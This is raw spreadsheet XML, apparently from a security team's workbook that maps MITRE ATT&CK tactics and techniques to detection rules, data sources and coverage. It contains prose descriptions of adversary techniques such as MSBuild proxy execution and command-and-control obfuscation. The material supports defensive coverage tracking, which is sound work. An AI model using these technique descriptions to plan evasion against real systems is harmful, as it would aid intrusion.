  <c r="F380" i="19"/>
  <c r="F382" i="19"/>
  <c r="F376" i="19"/>
  <c r="F377" i="19"/>
  <c r="F381" i="19"/>
  <c r="F379" i="19"/>
  <c r="F617" i="19"/>
  <c r="F618" i="19"/>
  <c r="F371" i="19"/>
  <c r="F372" i="19"/>
  <c r="F373" i="19"/>
  <c r="F374" i="19"/>
  <c r="F619" i="19"/>
  <c r="F239" i="19"/>
  <c r="F240" i="19"/>
  <c r="F238" i="19"/>
  <c r="F620" i="19"/>
  <c r="F147" i="19"/>
  <c r="F144" i="19"/>
  <c r="F145" i="19"/>
  <c r="F146" i="19"/>
  <c r="F621" i="19"/>
  <c r="F622" i="19"/>
  <c r="F291" i="19"/>
  <c r="F293" i="19"/>
  <c r="F292" i="19"/>
  <c r="F623" i="19"/>
  <c r="F587" i="19"/>
  <c r="F586" i="19"/>
  <c r="F624" i="19"/>
  <c r="F173" i="19"/>
  <c r="F172" i="19"/>
  <c r="F174" i="19"/>
  <c r="F625" i="19"/>
  <c r="F626" i="19"/>
  <c r="F366" i="19"/>
  <c r="F368" i="19"/>
  <c r="F365" i="19"/>
  <c r="F367" i="19"/>
  <c r="F369" i="19"/>
  <c r="F6" i="19"/>
  <c r="F205" i="19"/>
  <c r="F206" i="19"/>
  <c r="F207" i="19"/>
  <c r="F208" i="19"/>
  <c r="F204" i="19"/>
  <c r="F15" i="19"/>
  <c r="F16" i="19"/>
  <c r="F2" i="19"/>
  <c r="P537" i="19" l="1"/>
  <c r="O539" i="19"/>
  <c r="S539" i="19"/>
  <c r="P539" i="19"/>
  <c r="S537" i="19"/>
  <c r="O537" i="19"/>
  <c r="D1" i="12" a="1"/>
  <c r="D1" i="12" s="1"/>
  <c r="C11" i="23" s="1"/>
  <c r="Z1" i="12" a="1"/>
  <c r="Z1" i="12" s="1"/>
  <c r="N11" i="23" s="1"/>
  <c r="AB1" i="12" a="1"/>
  <c r="AB1" i="12" s="1"/>
  <c r="O11" i="23" s="1"/>
  <c r="B1" i="12" a="1"/>
  <c r="B1" i="12" s="1"/>
  <c r="B11" i="23" s="1"/>
  <c r="H1" i="12" a="1"/>
  <c r="H1" i="12" s="1"/>
  <c r="E11" i="23" s="1"/>
  <c r="X1" i="12" a="1"/>
  <c r="X1" i="12" s="1"/>
  <c r="M11" i="23" s="1"/>
  <c r="T1" i="12" a="1"/>
  <c r="T1" i="12" s="1"/>
  <c r="K11" i="23" s="1"/>
  <c r="V1" i="12" a="1"/>
  <c r="V1" i="12" s="1"/>
  <c r="L11" i="23" s="1"/>
  <c r="R1" i="12" a="1"/>
  <c r="R1" i="12" s="1"/>
  <c r="J11" i="23" s="1"/>
  <c r="P1" i="12" a="1"/>
  <c r="P1" i="12" s="1"/>
  <c r="I11" i="23" s="1"/>
  <c r="J1" i="12" a="1"/>
  <c r="J1" i="12" s="1"/>
  <c r="F11" i="23" s="1"/>
  <c r="N1" i="12" a="1"/>
  <c r="N1" i="12" s="1"/>
  <c r="H11" i="23" s="1"/>
  <c r="L1" i="12" a="1"/>
  <c r="L1" i="12" s="1"/>
  <c r="G11" i="23" s="1"/>
  <c r="F1" i="12" a="1"/>
  <c r="F1" i="12" s="1"/>
  <c r="D11" i="23" s="1"/>
  <c r="C4" i="25" l="1"/>
  <c r="N4" i="25"/>
  <c r="O4" i="25"/>
  <c r="B4" i="25"/>
  <c r="P11" i="23"/>
  <c r="D4" i="25"/>
  <c r="G4" i="25"/>
  <c r="H4" i="25"/>
  <c r="F4" i="25"/>
  <c r="I4" i="25"/>
  <c r="J4" i="25"/>
  <c r="L4" i="25"/>
  <c r="K4" i="25"/>
  <c r="M4" i="25"/>
  <c r="E4" i="2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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="6586" uniqueCount="3368">
  <si>
    <t>Reconnaissance</t>
  </si>
  <si>
    <t>Resource Development</t>
  </si>
  <si>
    <t>Initial Access</t>
  </si>
  <si>
    <t>Execution</t>
  </si>
  <si>
    <t>Persistence</t>
  </si>
  <si>
    <t>Privilege Escalation</t>
  </si>
  <si>
    <t>Defense Evasion</t>
  </si>
  <si>
    <t>Credential Access</t>
  </si>
  <si>
    <t>Discovery</t>
  </si>
  <si>
    <t>Lateral Movement</t>
  </si>
  <si>
    <t>Collection</t>
  </si>
  <si>
    <t>Command and Control</t>
  </si>
  <si>
    <t>Exfiltration</t>
  </si>
  <si>
    <t>Impact</t>
  </si>
  <si>
    <t>Active Scanning (T1595)</t>
  </si>
  <si>
    <t>Acquire Access (T1650)</t>
  </si>
  <si>
    <t>Content Injection (T1659)</t>
  </si>
  <si>
    <t>Cloud Administration Command (T1651)</t>
  </si>
  <si>
    <t>Account Manipulation (T1098)</t>
  </si>
  <si>
    <t>Abuse Elevation Control Mechanism (T1548)</t>
  </si>
  <si>
    <t>Adversary-in-the-Middle (T1557)</t>
  </si>
  <si>
    <t>Account Discovery (T1087)</t>
  </si>
  <si>
    <t>Exploitation of Remote Services (T1210)</t>
  </si>
  <si>
    <t>Application Layer Protocol (T1071)</t>
  </si>
  <si>
    <t>Automated Exfiltration (T1020)</t>
  </si>
  <si>
    <t>Account Access Removal (T1531)</t>
  </si>
  <si>
    <t>Gather Victim Host Information (T1592)</t>
  </si>
  <si>
    <t>Acquire Infrastructure (T1583)</t>
  </si>
  <si>
    <t>Drive-by Compromise (T1189)</t>
  </si>
  <si>
    <t>Command and Scripting Interpreter (T1059)</t>
  </si>
  <si>
    <t>BITS Jobs (T1197)</t>
  </si>
  <si>
    <t>Access Token Manipulation (T1134)</t>
  </si>
  <si>
    <t>Brute Force (T1110)</t>
  </si>
  <si>
    <t>Application Window Discovery (T1010)</t>
  </si>
  <si>
    <t>Internal Spearphishing (T1534)</t>
  </si>
  <si>
    <t>Archive Collected Data (T1560)</t>
  </si>
  <si>
    <t>Communication Through Removable Media (T1092)</t>
  </si>
  <si>
    <t>Data Transfer Size Limits (T1030)</t>
  </si>
  <si>
    <t>Data Destruction (T1485)</t>
  </si>
  <si>
    <t>Gather Victim Identity Information (T1589)</t>
  </si>
  <si>
    <t>Compromise Accounts (T1586)</t>
  </si>
  <si>
    <t>Exploit Public-Facing Application (T1190)</t>
  </si>
  <si>
    <t>Container Administration Command (T1609)</t>
  </si>
  <si>
    <t>Boot or Logon Autostart Execution (T1547)</t>
  </si>
  <si>
    <t>Credentials from Password Stores (T1555)</t>
  </si>
  <si>
    <t>Browser Information Discovery (T1217)</t>
  </si>
  <si>
    <t>Lateral Tool Transfer (T1570)</t>
  </si>
  <si>
    <t>Audio Capture (T1123)</t>
  </si>
  <si>
    <t>Exfiltration Over Alternative Protocol (T1048)</t>
  </si>
  <si>
    <t>Data Encrypted for Impact (T1486)</t>
  </si>
  <si>
    <t>Gather Victim Network Information (T1590)</t>
  </si>
  <si>
    <t>Compromise Infrastructure (T1584)</t>
  </si>
  <si>
    <t>External Remote Services (T1133)</t>
  </si>
  <si>
    <t>Deploy Container (T1610)</t>
  </si>
  <si>
    <t>Boot or Logon Initialization Scripts (T1037)</t>
  </si>
  <si>
    <t>Build Image on Host (T1612)</t>
  </si>
  <si>
    <t>Exploitation for Credential Access (T1212)</t>
  </si>
  <si>
    <t>Cloud Infrastructure Discovery (T1580)</t>
  </si>
  <si>
    <t>Remote Service Session Hijacking (T1563)</t>
  </si>
  <si>
    <t>Automated Collection (T1119)</t>
  </si>
  <si>
    <t>Data Encoding (T1132)</t>
  </si>
  <si>
    <t>Exfiltration Over C2 Channel (T1041)</t>
  </si>
  <si>
    <t>Data Manipulation (T1565)</t>
  </si>
  <si>
    <t>Gather Victim Org Information (T1591)</t>
  </si>
  <si>
    <t>Develop Capabilities (T1587)</t>
  </si>
  <si>
    <t>Hardware Additions (T1200)</t>
  </si>
  <si>
    <t>Exploitation for Client Execution (T1203)</t>
  </si>
  <si>
    <t>Browser Extensions (T1176)</t>
  </si>
  <si>
    <t>Debugger Evasion (T1622)</t>
  </si>
  <si>
    <t>Forced Authentication (T1187)</t>
  </si>
  <si>
    <t>Cloud Service Dashboard (T1538)</t>
  </si>
  <si>
    <t>Remote Services (T1021)</t>
  </si>
  <si>
    <t>Browser Session Hijacking (T1185)</t>
  </si>
  <si>
    <t>Data Obfuscation (T1001)</t>
  </si>
  <si>
    <t>Exfiltration Over Other Network Medium (T1011)</t>
  </si>
  <si>
    <t>Defacement (T1491)</t>
  </si>
  <si>
    <t>Phishing for Information (T1598)</t>
  </si>
  <si>
    <t>Establish Accounts (T1585)</t>
  </si>
  <si>
    <t>Phishing (T1566)</t>
  </si>
  <si>
    <t>Inter-Process Communication (T1559)</t>
  </si>
  <si>
    <t>Compromise Host Software Binary (T1554)</t>
  </si>
  <si>
    <t>Create or Modify System Process (T1543)</t>
  </si>
  <si>
    <t>Deobfuscate/Decode Files or Information (T1140)</t>
  </si>
  <si>
    <t>Forge Web Credentials (T1606)</t>
  </si>
  <si>
    <t>Cloud Service Discovery (T1526)</t>
  </si>
  <si>
    <t>Replication Through Removable Media (T1091)</t>
  </si>
  <si>
    <t>Clipboard Data (T1115)</t>
  </si>
  <si>
    <t>Dynamic Resolution (T1568)</t>
  </si>
  <si>
    <t>Exfiltration Over Physical Medium (T1052)</t>
  </si>
  <si>
    <t>Disk Wipe (T1561)</t>
  </si>
  <si>
    <t>Search Closed Sources (T1597)</t>
  </si>
  <si>
    <t>Obtain Capabilities (T1588)</t>
  </si>
  <si>
    <t>Native API (T1106)</t>
  </si>
  <si>
    <t>Create Account (T1136)</t>
  </si>
  <si>
    <t>Domain or Tenant Policy Modification (T1484)</t>
  </si>
  <si>
    <t>Input Capture (T1056)</t>
  </si>
  <si>
    <t>Cloud Storage Object Discovery (T1619)</t>
  </si>
  <si>
    <t>Software Deployment Tools (T1072)</t>
  </si>
  <si>
    <t>Data Staged (T1074)</t>
  </si>
  <si>
    <t>Encrypted Channel (T1573)</t>
  </si>
  <si>
    <t>Exfiltration Over Web Service (T1567)</t>
  </si>
  <si>
    <t>Endpoint Denial of Service (T1499)</t>
  </si>
  <si>
    <t>Search Open Technical Databases (T1596)</t>
  </si>
  <si>
    <t>Stage Capabilities (T1608)</t>
  </si>
  <si>
    <t>Supply Chain Compromise (T1195)</t>
  </si>
  <si>
    <t>Scheduled Task/Job (T1053)</t>
  </si>
  <si>
    <t>Escape to Host (T1611)</t>
  </si>
  <si>
    <t>Direct Volume Access (T1006)</t>
  </si>
  <si>
    <t>Modify Authentication Process (T1556)</t>
  </si>
  <si>
    <t>Container and Resource Discovery (T1613)</t>
  </si>
  <si>
    <t>Taint Shared Content (T1080)</t>
  </si>
  <si>
    <t>Data from Cloud Storage (T1530)</t>
  </si>
  <si>
    <t>Fallback Channels (T1008)</t>
  </si>
  <si>
    <t>Scheduled Transfer (T1029)</t>
  </si>
  <si>
    <t>Financial Theft (T1657)</t>
  </si>
  <si>
    <t>Search Open Websites/Domains (T1593)</t>
  </si>
  <si>
    <t>Trusted Relationship (T1199)</t>
  </si>
  <si>
    <t>Serverless Execution (T1648)</t>
  </si>
  <si>
    <t>Event Triggered Execution (T1546)</t>
  </si>
  <si>
    <t>Multi-Factor Authentication Interception (T1111)</t>
  </si>
  <si>
    <t>Use Alternate Authentication Material (T1550)</t>
  </si>
  <si>
    <t>Data from Configuration Repository (T1602)</t>
  </si>
  <si>
    <t>Hide Infrastructure (T1665)</t>
  </si>
  <si>
    <t>Transfer Data to Cloud Account (T1537)</t>
  </si>
  <si>
    <t>Firmware Corruption (T1495)</t>
  </si>
  <si>
    <t>Search Victim-Owned Websites (T1594)</t>
  </si>
  <si>
    <t>Valid Accounts (T1078)</t>
  </si>
  <si>
    <t>Shared Modules (T1129)</t>
  </si>
  <si>
    <t>Exploitation for Privilege Escalation (T1068)</t>
  </si>
  <si>
    <t>Execution Guardrails (T1480)</t>
  </si>
  <si>
    <t>Multi-Factor Authentication Request Generation (T1621)</t>
  </si>
  <si>
    <t>Device Driver Discovery (T1652)</t>
  </si>
  <si>
    <t>Data from Information Repositories (T1213)</t>
  </si>
  <si>
    <t>Ingress Tool Transfer (T1105)</t>
  </si>
  <si>
    <t>Inhibit System Recovery (T1490)</t>
  </si>
  <si>
    <t>Hijack Execution Flow (T1574)</t>
  </si>
  <si>
    <t>Exploitation for Defense Evasion (T1211)</t>
  </si>
  <si>
    <t>Network Sniffing (T1040)</t>
  </si>
  <si>
    <t>Domain Trust Discovery (T1482)</t>
  </si>
  <si>
    <t>Data from Local System (T1005)</t>
  </si>
  <si>
    <t>Multi-Stage Channels (T1104)</t>
  </si>
  <si>
    <t>Network Denial of Service (T1498)</t>
  </si>
  <si>
    <t>System Services (T1569)</t>
  </si>
  <si>
    <t>Implant Internal Image (T1525)</t>
  </si>
  <si>
    <t>Process Injection (T1055)</t>
  </si>
  <si>
    <t>File and Directory Permissions Modification (T1222)</t>
  </si>
  <si>
    <t>OS Credential Dumping (T1003)</t>
  </si>
  <si>
    <t>File and Directory Discovery (T1083)</t>
  </si>
  <si>
    <t>Data from Network Shared Drive (T1039)</t>
  </si>
  <si>
    <t>Non-Application Layer Protocol (T1095)</t>
  </si>
  <si>
    <t>Resource Hijacking (T1496)</t>
  </si>
  <si>
    <t>User Execution (T1204)</t>
  </si>
  <si>
    <t>Hide Artifacts (T1564)</t>
  </si>
  <si>
    <t>Steal Application Access Token (T1528)</t>
  </si>
  <si>
    <t>Group Policy Discovery (T1615)</t>
  </si>
  <si>
    <t>Data from Removable Media (T1025)</t>
  </si>
  <si>
    <t>Non-Standard Port (T1571)</t>
  </si>
  <si>
    <t>Service Stop (T1489)</t>
  </si>
  <si>
    <t>Windows Management Instrumentation (T1047)</t>
  </si>
  <si>
    <t>Office Application Startup (T1137)</t>
  </si>
  <si>
    <t>Steal Web Session Cookie (T1539)</t>
  </si>
  <si>
    <t>Log Enumeration (T1654)</t>
  </si>
  <si>
    <t>Email Collection (T1114)</t>
  </si>
  <si>
    <t>Protocol Tunneling (T1572)</t>
  </si>
  <si>
    <t>System Shutdown/Reboot (T1529)</t>
  </si>
  <si>
    <t>Power Settings (T1653)</t>
  </si>
  <si>
    <t>Impair Defenses (T1562)</t>
  </si>
  <si>
    <t>Steal or Forge Authentication Certificates (T1649)</t>
  </si>
  <si>
    <t>Network Service Discovery (T1046)</t>
  </si>
  <si>
    <t>Proxy (T1090)</t>
  </si>
  <si>
    <t>Pre-OS Boot (T1542)</t>
  </si>
  <si>
    <t>Impersonation (T1656)</t>
  </si>
  <si>
    <t>Steal or Forge Kerberos Tickets (T1558)</t>
  </si>
  <si>
    <t>Network Share Discovery (T1135)</t>
  </si>
  <si>
    <t>Screen Capture (T1113)</t>
  </si>
  <si>
    <t>Remote Access Software (T1219)</t>
  </si>
  <si>
    <t>Indicator Removal (T1070)</t>
  </si>
  <si>
    <t>Unsecured Credentials (T1552)</t>
  </si>
  <si>
    <t>Video Capture (T1125)</t>
  </si>
  <si>
    <t>Traffic Signaling (T1205)</t>
  </si>
  <si>
    <t>Server Software Component (T1505)</t>
  </si>
  <si>
    <t>Indirect Command Execution (T1202)</t>
  </si>
  <si>
    <t>Password Policy Discovery (T1201)</t>
  </si>
  <si>
    <t>Web Service (T1102)</t>
  </si>
  <si>
    <t>Masquerading (T1036)</t>
  </si>
  <si>
    <t>Peripheral Device Discovery (T1120)</t>
  </si>
  <si>
    <t>Permission Groups Discovery (T1069)</t>
  </si>
  <si>
    <t>Modify Cloud Compute Infrastructure (T1578)</t>
  </si>
  <si>
    <t>Process Discovery (T1057)</t>
  </si>
  <si>
    <t>Modify Cloud Resource Hierarchy (T1666)</t>
  </si>
  <si>
    <t>Query Registry (T1012)</t>
  </si>
  <si>
    <t>Modify Registry (T1112)</t>
  </si>
  <si>
    <t>Remote System Discovery (T1018)</t>
  </si>
  <si>
    <t>Modify System Image (T1601)</t>
  </si>
  <si>
    <t>Software Discovery (T1518)</t>
  </si>
  <si>
    <t>Network Boundary Bridging (T1599)</t>
  </si>
  <si>
    <t>System Information Discovery (T1082)</t>
  </si>
  <si>
    <t>Obfuscated Files or Information (T1027)</t>
  </si>
  <si>
    <t>System Location Discovery (T1614)</t>
  </si>
  <si>
    <t>Plist File Modification (T1647)</t>
  </si>
  <si>
    <t>System Network Configuration Discovery (T1016)</t>
  </si>
  <si>
    <t>System Network Connections Discovery (T1049)</t>
  </si>
  <si>
    <t>System Owner/User Discovery (T1033)</t>
  </si>
  <si>
    <t>Reflective Code Loading (T1620)</t>
  </si>
  <si>
    <t>System Service Discovery (T1007)</t>
  </si>
  <si>
    <t>Rogue Domain Controller (T1207)</t>
  </si>
  <si>
    <t>System Time Discovery (T1124)</t>
  </si>
  <si>
    <t>Rootkit (T1014)</t>
  </si>
  <si>
    <t>Virtualization/Sandbox Evasion (T1497)</t>
  </si>
  <si>
    <t>Subvert Trust Controls (T1553)</t>
  </si>
  <si>
    <t>System Binary Proxy Execution (T1218)</t>
  </si>
  <si>
    <t>System Script Proxy Execution (T1216)</t>
  </si>
  <si>
    <t>Template Injection (T1221)</t>
  </si>
  <si>
    <t>Trusted Developer Utilities Proxy Execution (T1127)</t>
  </si>
  <si>
    <t>Unused/Unsupported Cloud Regions (T1535)</t>
  </si>
  <si>
    <t>Weaken Encryption (T1600)</t>
  </si>
  <si>
    <t>XSL Script Processing (T1220)</t>
  </si>
  <si>
    <t>Source</t>
  </si>
  <si>
    <t>Use Case</t>
  </si>
  <si>
    <t>Rule Description</t>
  </si>
  <si>
    <t>Is Active</t>
  </si>
  <si>
    <t>Attack1</t>
  </si>
  <si>
    <t>Attack2</t>
  </si>
  <si>
    <t>Attack3</t>
  </si>
  <si>
    <t>Attack4</t>
  </si>
  <si>
    <t>Attack5</t>
  </si>
  <si>
    <t>Attack6</t>
  </si>
  <si>
    <t>Attack7</t>
  </si>
  <si>
    <t>Attack8</t>
  </si>
  <si>
    <t>Attack9</t>
  </si>
  <si>
    <t>Attack10</t>
  </si>
  <si>
    <t>yes</t>
  </si>
  <si>
    <t>RDP Hijacking (T1563.002)</t>
  </si>
  <si>
    <t>SSH (T1021.004)</t>
  </si>
  <si>
    <t>SSH Hijacking (T1563.001)</t>
  </si>
  <si>
    <t>Office Template Macros (T1137.001)</t>
  </si>
  <si>
    <t>PowerShell (T1059.001)</t>
  </si>
  <si>
    <t>Cloud Accounts (T1078.004)</t>
  </si>
  <si>
    <t>Additional Cloud Roles (T1098.003)</t>
  </si>
  <si>
    <t>SMB/Windows Admin Shares (T1021.002)</t>
  </si>
  <si>
    <t>Additional Cloud Credentials (T1098.001)</t>
  </si>
  <si>
    <t>Scheduled Task (T1053.005)</t>
  </si>
  <si>
    <t>Cloud Secrets Management Stores (T1555.006)</t>
  </si>
  <si>
    <t>LSASS Memory (T1003.001)</t>
  </si>
  <si>
    <t>Cloud Account (T1136.003)</t>
  </si>
  <si>
    <t>Cloud Account (T1087.004)</t>
  </si>
  <si>
    <t>Kerberoasting (T1558.003)</t>
  </si>
  <si>
    <t>Web Protocols (T1071.001)</t>
  </si>
  <si>
    <t>Hidden Users (T1564.002)</t>
  </si>
  <si>
    <t>Exfiltration over USB (T1052.001)</t>
  </si>
  <si>
    <t>Application Access Token (T1550.001)</t>
  </si>
  <si>
    <t>Scanning IP Blocks (T1595.001)</t>
  </si>
  <si>
    <t>Local Accounts (T1078.003)</t>
  </si>
  <si>
    <t>Disable or Modify Linux Audit System (T1562.012)</t>
  </si>
  <si>
    <t>Disable Windows Event Logging (T1562.002)</t>
  </si>
  <si>
    <t>Domain Account (T1087.002)</t>
  </si>
  <si>
    <t>Disable or Modify Cloud Logs (T1562.008)</t>
  </si>
  <si>
    <t>Cloud Groups (T1069.003)</t>
  </si>
  <si>
    <t>Disable or Modify Tools (T1562.001)</t>
  </si>
  <si>
    <t>GUI Input Capture (T1056.002)</t>
  </si>
  <si>
    <t>Wi-Fi Discovery (T1016.002)</t>
  </si>
  <si>
    <t>Domains (T1584.001)</t>
  </si>
  <si>
    <t>Domain Fronting (T1090.004)</t>
  </si>
  <si>
    <t>Password Guessing (T1110.001)</t>
  </si>
  <si>
    <t>Credential Stuffing (T1110.004)</t>
  </si>
  <si>
    <t>Domain Accounts (T1078.002)</t>
  </si>
  <si>
    <t>Security Software Discovery (T1518.001)</t>
  </si>
  <si>
    <t>Local Groups (T1069.001)</t>
  </si>
  <si>
    <t>Malware (T1588.001)</t>
  </si>
  <si>
    <t>Malware (T1587.001)</t>
  </si>
  <si>
    <t>Installer Packages (T1546.016)</t>
  </si>
  <si>
    <t>Windows Command Shell (T1059.003)</t>
  </si>
  <si>
    <t>Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)
Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)</t>
  </si>
  <si>
    <t>MSBuild (T1127.001)</t>
  </si>
  <si>
    <t>Email Hiding Rules (T1564.008)</t>
  </si>
  <si>
    <t>Email Forwarding Rule (T1114.003)</t>
  </si>
  <si>
    <t>Outlook Rules (T1137.005)</t>
  </si>
  <si>
    <t>Domain Account (T1136.002)</t>
  </si>
  <si>
    <t>Device Registration (T1098.005)</t>
  </si>
  <si>
    <t>Command Obfuscation (T1027.010)</t>
  </si>
  <si>
    <t>Clear Windows Event Logs (T1070.001)</t>
  </si>
  <si>
    <t>Outlook Home Page (T1137.004)</t>
  </si>
  <si>
    <t>Disable or Modify Cloud Firewall (T1562.007)</t>
  </si>
  <si>
    <t>Keylogging (T1056.001)</t>
  </si>
  <si>
    <t>Credential API Hooking (T1056.004)</t>
  </si>
  <si>
    <t>Regsvr32 (T1218.010)</t>
  </si>
  <si>
    <t>Rundll32 (T1218.011)</t>
  </si>
  <si>
    <t>Create Process with Token (T1134.002)</t>
  </si>
  <si>
    <t>Internet Connection Discovery (T1016.001)</t>
  </si>
  <si>
    <t>Compromise Hardware Supply Chain (T1195.003)</t>
  </si>
  <si>
    <t>Password Spraying (T1110.003)</t>
  </si>
  <si>
    <t>Create Cloud Instance (T1578.002)</t>
  </si>
  <si>
    <t>Modify Cloud Compute Configurations (T1578.005)</t>
  </si>
  <si>
    <t>Direct Cloud VM Connections (T1021.008)</t>
  </si>
  <si>
    <t>Protocol or Service Impersonation (T1001.003)</t>
  </si>
  <si>
    <t>Mail Protocols (T1071.003)</t>
  </si>
  <si>
    <t>File Transfer Protocols (T1071.002)</t>
  </si>
  <si>
    <t>Sharepoint (T1213.002)</t>
  </si>
  <si>
    <t>Malicious File (T1204.002)</t>
  </si>
  <si>
    <t>Double File Extension (T1036.007)</t>
  </si>
  <si>
    <t>Clear Mailbox Data (T1070.008)</t>
  </si>
  <si>
    <t>Additional Email Delegate Permissions (T1098.002)</t>
  </si>
  <si>
    <t>Exfiltration to Cloud Storage (T1567.002)</t>
  </si>
  <si>
    <t>Malicious Link (T1204.001)</t>
  </si>
  <si>
    <t>DCSync (T1003.006)</t>
  </si>
  <si>
    <t>Distributed Component Object Model (T1021.003)</t>
  </si>
  <si>
    <t>Remote Email Collection (T1114.002)</t>
  </si>
  <si>
    <t>Multi-Factor Authentication (T1556.006)</t>
  </si>
  <si>
    <t>Portable Executable Injection (T1055.002)</t>
  </si>
  <si>
    <t>Bypass User Account Control (T1548.002)</t>
  </si>
  <si>
    <t>Clear Linux or Mac System Logs (T1070.002)</t>
  </si>
  <si>
    <t>AppCert DLLs (T1546.009)</t>
  </si>
  <si>
    <t>Botnet (T1584.005)</t>
  </si>
  <si>
    <t>Local Account (T1136.001)</t>
  </si>
  <si>
    <t>SID-History Injection (T1134.005)</t>
  </si>
  <si>
    <t>Pass the Hash (T1550.002)</t>
  </si>
  <si>
    <t>Pass the Ticket (T1550.003)</t>
  </si>
  <si>
    <t>Golden Ticket (T1558.001)</t>
  </si>
  <si>
    <t>Domain Controller Authentication (T1556.001)</t>
  </si>
  <si>
    <t>Windows Remote Management (T1021.006)</t>
  </si>
  <si>
    <t>Domain Groups (T1069.002)</t>
  </si>
  <si>
    <t>Service Execution (T1569.002)</t>
  </si>
  <si>
    <t>Windows Service (T1543.003)</t>
  </si>
  <si>
    <t>Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003)</t>
  </si>
  <si>
    <t>DNS (T1071.004)</t>
  </si>
  <si>
    <t>LLMNR/NBT-NS Poisoning and SMB Relay (T1557.001)</t>
  </si>
  <si>
    <t>AS-REP Roasting (T1558.004)</t>
  </si>
  <si>
    <t>Private Keys (T1552.004)</t>
  </si>
  <si>
    <t>Token Impersonation/Theft (T1134.001)</t>
  </si>
  <si>
    <t>Print Processors (T1547.012)</t>
  </si>
  <si>
    <t>Yes</t>
  </si>
  <si>
    <t>Spearphishing Attachment (T1598.002)</t>
  </si>
  <si>
    <t>Spearphishing Link (T1566.002)</t>
  </si>
  <si>
    <t>Spearphishing Attachment (T1566.001)</t>
  </si>
  <si>
    <t>Spearphishing Voice (T1566.004)</t>
  </si>
  <si>
    <t>Code Signing (T1553.002)</t>
  </si>
  <si>
    <t>Outlook Forms (T1137.003)</t>
  </si>
  <si>
    <t>Visual Basic (T1059.005)</t>
  </si>
  <si>
    <t>JavaScript (T1059.007)</t>
  </si>
  <si>
    <t>Windows Management Instrumentation Event Subscription (T1546.003)</t>
  </si>
  <si>
    <t>Compromise Software Supply Chain (T1195.002)</t>
  </si>
  <si>
    <t>Compromise Software Dependencies and Development Tools (T1195.001)</t>
  </si>
  <si>
    <t>Technique</t>
  </si>
  <si>
    <t>ID</t>
  </si>
  <si>
    <t>Name</t>
  </si>
  <si>
    <t>Tactics</t>
  </si>
  <si>
    <t>Data Sources</t>
  </si>
  <si>
    <t>Data Sources No.</t>
  </si>
  <si>
    <t>Data Sources Available</t>
  </si>
  <si>
    <t>No. of Sub Techniques</t>
  </si>
  <si>
    <t>Detection Rules for Technique</t>
  </si>
  <si>
    <t>Detection Rules for SubTech</t>
  </si>
  <si>
    <t>Min. Detection Rules</t>
  </si>
  <si>
    <t>Detection Rules Modifier</t>
  </si>
  <si>
    <t>Expected Detection Rules</t>
  </si>
  <si>
    <t>Detection Rules</t>
  </si>
  <si>
    <t>Coverage</t>
  </si>
  <si>
    <t>Technique Status</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>ID Checks</t>
  </si>
  <si>
    <t>Error Checks</t>
  </si>
  <si>
    <t>platforms</t>
  </si>
  <si>
    <t>description</t>
  </si>
  <si>
    <t>detection</t>
  </si>
  <si>
    <t>is sub-technique</t>
  </si>
  <si>
    <t>sub-technique of</t>
  </si>
  <si>
    <t>T1001</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Content</t>
  </si>
  <si>
    <t>Linux, Windows, macOS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. </t>
  </si>
  <si>
    <t>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communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1001.001</t>
  </si>
  <si>
    <t>Junk Data (T1001.001)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. </t>
  </si>
  <si>
    <t>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communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1001.002</t>
  </si>
  <si>
    <t>Steganography (T1001.002)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. </t>
  </si>
  <si>
    <t>T1001.003</t>
  </si>
  <si>
    <t>Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  
Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. 
Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)</t>
  </si>
  <si>
    <t>T1003</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Access, Command: Command Execution, File: File Access, File: File Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
